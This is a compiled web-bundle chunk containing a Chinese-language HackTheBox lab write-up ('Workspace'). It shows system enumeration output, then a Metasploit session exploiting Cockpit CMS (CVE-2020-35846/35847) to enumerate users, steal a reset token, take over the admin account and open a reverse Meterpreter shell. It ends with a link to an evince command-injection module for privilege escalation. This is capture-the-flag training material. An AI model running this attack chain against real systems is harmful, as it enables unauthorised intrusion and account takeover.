"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[7339],{24233:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>t,metadata:()=>r,toc:()=>p});const r=JSON.parse('{"id":"HackTheBox/Battlegrounds/Workspace","title":"Workspace","description":"\u4fe1\u606f\u6536\u96c6","source":"@site/docs/HackTheBox/Battlegrounds/Workspace.md","sourceDirName":"HackTheBox/Battlegrounds","slug":"/HackTheBox/Battlegrounds/Workspace","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Workspace","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Battlegrounds/Workspace.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Triston","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Triston"},"next":{"title":"Challenges","permalink":"/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges"}}');var a=s(74848),i=s(28453);const t={},o="Workspace",c={},p=[{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:2},{value:"Port 9000 Cockpit CMS",id:"port-9000-cockpit-cms",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function u(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.header,{children:(0,a.jsx)(e.h1,{id:"workspace",children:"Workspace"})}),"\n",(0,a.jsx)(e.h2,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'Detected ss and lsof, executing related commands...\nPort: 53, PID: 637\n\u2014> Command: /lib/systemd/systemd-resolved \nPort: 22, PID: 869\n\u2014> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \nPort: 33060, PID: 902\n\u2014> Command: /usr/sbin/mysqld \nPort: 3306, PID: 902\n\u2014> Command: /usr/sbin/mysqld \n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nNginx is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nDetected apache, analyzing its configuration...\n\nUnique Hosts:\n\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nChecking /etc/sudoers (active configurations only):\n  Defaults      env_reset\n  Defaults      mail_badpass\n  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n  root  ALL=(ALL:ALL) ALL\n  %admin ALL=(ALL) ALL\n  %sudo ALL=(ALL:ALL) ALL\n  webdev ALL=(ALL) NOPASSWD: /usr/bin/evince /opt/comic_books/*\n\u2014\u2014\u2014\nFinding SUID files:\n/snap/snapd/12883/usr/lib/snapd/snap-confine\n/snap/snapd/12704/usr/lib/snapd/snap-confine\n/snap/core18/2128/bin/mount\n/snap/core18/2128/bin/ping\n/snap/core18/2128/bin/su\n/snap/core18/2128/bin/umount\n/snap/core18/2128/usr/bin/chfn\n/snap/core18/2128/usr/bin/chsh\n/snap/core18/2128/usr/bin/gpasswd\n/snap/core18/2128/usr/bin/newgrp\n/snap/core18/2128/usr/bin/passwd\n/snap/core18/2128/usr/bin/sudo\n/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/2128/usr/lib/openssh/ssh-keysign\n/snap/core18/2074/bin/mount\n/snap/core18/2074/bin/ping\n/snap/core18/2074/bin/su\n/snap/core18/2074/bin/umount\n/snap/core18/2074/usr/bin/chfn\n/snap/core18/2074/usr/bin/chsh\n/snap/core18/2074/usr/bin/gpasswd\n/snap/core18/2074/usr/bin/newgrp\n/snap/core18/2074/usr/bin/passwd\n/snap/core18/2074/usr/bin/sudo\n/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/2074/usr/lib/openssh/ssh-keysign\n/snap/core20/1081/usr/bin/chfn\n/snap/core20/1081/usr/bin/chsh\n/snap/core20/1081/usr/bin/gpasswd\n/snap/core20/1081/usr/bin/mount\n/snap/core20/1081/usr/bin/newgrp\n/snap/core20/1081/usr/bin/passwd\n/snap/core20/1081/usr/bin/su\n/snap/core20/1081/usr/bin/sudo\n/snap/core20/1081/usr/bin/umount\n/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1081/usr/lib/openssh/ssh-keysign\n/snap/core20/1026/usr/bin/chfn\n/snap/core20/1026/usr/bin/chsh\n/snap/core20/1026/usr/bin/gpasswd\n/snap/core20/1026/usr/bin/mount\n/snap/core20/1026/usr/bin/newgrp\n/snap/core20/1026/usr/bin/passwd\n/snap/core20/1026/usr/bin/su\n/snap/core20/1026/usr/bin/sudo\n/snap/core20/1026/usr/bin/umount\n/snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1026/usr/lib/openssh/ssh-keysign\n/usr/local/bin/ktsuss\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/openssh/ssh-keysign\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/fusermount\n/usr/bin/chsh\n/usr/bin/at\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/su\n\u2014\u2014\u2014\nFinding files with special capabilities:\n  /snap/core20/1081/usr/bin/ping = cap_net_raw+ep\n  /snap/core20/1026/usr/bin/ping = cap_net_raw+ep\n  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n  /usr/bin/ping = cap_net_raw+ep\n  /usr/bin/mtr-packet = cap_net_raw+ep\n  /usr/bin/traceroute6.iputils = cap_net_raw+ep\n\u2014\u2014\u2014\n'})}),"\n",(0,a.jsx)(e.h2,{id:"port-9000-cockpit-cms",children:"Port 9000 Cockpit CMS"}),"\n",(0,a.jsx)(e.p,{children:"\u76f4\u63a5\u4e0a msf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'msf6 exploit(multi/http/cockpit_cms_rce) > exploit \n[*] Started reverse TCP handler on 10.10.14.2:4444 \n[*] Attempting Username Enumeration (CVE-2020-35846)\n[+]   Found users: ["admin"]\n[-] Exploit aborted due to failure: bad-config: 10.10.110.102:9000 - User to exploit required\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/http/cockpit_cms_rce) > set user admin\nuser => admin\nmsf6 exploit(multi/http/cockpit_cms_rce) > exploit \n[*] Started reverse TCP handler on 10.10.14.2:4444 \n[*] Attempting Username Enumeration (CVE-2020-35846)\n[+]   Found users: ["admin"]\n[*] Obtaining reset tokens (CVE-2020-35847)\n[*] Attempting to generate tokens\n[*] Obtaining reset tokens (CVE-2020-35847)\n[+]   Found tokens: ["rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261"]\n[*] Checking token: rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261\n[*] Obtaining user info\n[*]   user: admin\n[*]   name: Admin\n[*]   email: admin@yourdomain.de\n[*]   active: true\n[*]   group: admin\n[*]   password: $2y$10$UjEHclDQTixCinRTQiE7IuIre5rNfs.t245Wh7L3obdzWM0Az4pZ2\n[*]   i18n: en\n[*]   _created: 1631196553\n[*]   _modified: 1631196553\n[*]   _id: 613a158938323733e40002be\n[*]   _reset_token: rp-dcb379e6eea4cde8dc266fabbae0b69067fd13be63261\n[*]   md5email: a11eea8bf873a483db461bb169beccec\n[+] Changing password to SRUxX4DTbT\n[+] Password update successful\n[*] Attempting login\n[+] Valid cookie for admin: e83850b838cf3b3a451998465d54c0f1=8vms2e3fs388r86teptevk5me6;\n[*] Attempting RCE\n[*] Sending stage (40004 bytes) to 10.10.110.102\n[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.110.102:39682) at 2025-04-14 21:55:27 +0800\n'})}),"\n",(0,a.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.a,{href:"https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/evince_cbt_cmd_injection.md",children:"metasploit-framework/documentation/modules/exploit/multi/fileformat/evince_cbt_cmd_injection.md at master \xb7 rapid7/metasploit-framework"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(u,{...n})}):u(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>t,x:()=>o});var r=s(96540);const a={},i=r.createContext(a);function t(n){const e=r.useContext(i);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:t(n.components),r.createElement(i.Provider,{value:e},n.children)}}}]);